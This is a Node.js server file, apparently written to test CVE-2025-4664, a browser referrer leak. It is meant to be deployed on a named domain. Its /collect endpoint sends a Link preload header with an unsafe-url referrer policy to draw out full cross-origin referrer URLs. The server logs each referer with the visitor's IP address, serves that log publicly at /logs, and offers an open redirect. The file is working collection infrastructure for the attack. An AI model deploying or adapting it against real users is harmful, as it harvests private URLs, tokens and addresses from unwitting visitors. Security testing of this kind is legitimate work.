/**
 * Node.js server for CVE-2025-4664 Link header referrer leak testing.
 * Deploy on ebniw.com.
 *
 * Usage: node link-header-server.js
 * Listens on port 3000 by default.
 */

const http = require('http');
const fs = require('fs');

const PORT = process.env.PORT || 3000;
const LOG_FILE = '/tmp/sop-referer-log.txt';

// 1x1 transparent GIF
const PIXEL = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

const server = http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);

    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'no-store');

    if (url.pathname === '/collect' || url.pathname === '/collect.gif') {
        // CVE-2025-4664: Set Link header with unsafe-url referrer policy
        res.setHeader('Link', '</pixel.gif>; rel=preload; as=image; referrerpolicy=unsafe-url');
        res.setHeader('Content-Type', 'image/gif');

        // Log referer
        const referer = req.headers.referer || 'none';
        const logEntry = `${new Date().toISOString()} | ${req.socket.remoteAddress} | Referer: ${referer}\n`;
        fs.appendFileSync(LOG_FILE, logEntry);
        console.log(`[COLLECT] ${logEntry.trim()}`);

        res.end(PIXEL);
    } else if (url.pathname === '/pixel.gif') {
        res.setHeader('Content-Type', 'image/gif');
        res.end(PIXEL);
    } else if (url.pathname === '/logs') {
        // View collected referers
        res.setHeader('Content-Type', 'text/plain');
        try {
            res.end(fs.readFileSync(LOG_FILE, 'utf-8'));
        } catch (e) {
            res.end('No logs yet.');
        }
    } else if (url.pathname === '/redirect') {
        const target = url.searchParams.get('url');
        if (target) {
            res.writeHead(302, { Location: target });
            res.end();
        } else {
            res.writeHead(400);
            res.end('Missing ?url= parameter');
        }
    } else {
        res.setHeader('Content-Type', 'text/html');
        res.end(`
            <html><body style="font-family:monospace;padding:20px;">
            <h2>SOP Bypass Test - Cross-Origin Server</h2>
            <p>Domain: ${req.headers.host}</p>
            <p>Endpoints:</p>
            <ul>
                <li>/collect - Returns Link header (CVE-2025-4664 test)</li>
                <li>/logs - View collected referer logs</li>
                <li>/redirect?url=... - 302 redirect</li>
            </ul>
            <div id="secret-data">XORIGIN_SECRET_DATA</div>
            </body></html>
        `);
    }
});

server.listen(PORT, () => {
    console.log(`[SOP Test Server] Listening on port ${PORT}`);
    console.log(`[SOP Test Server] Endpoints: /collect, /logs, /redirect`);
});
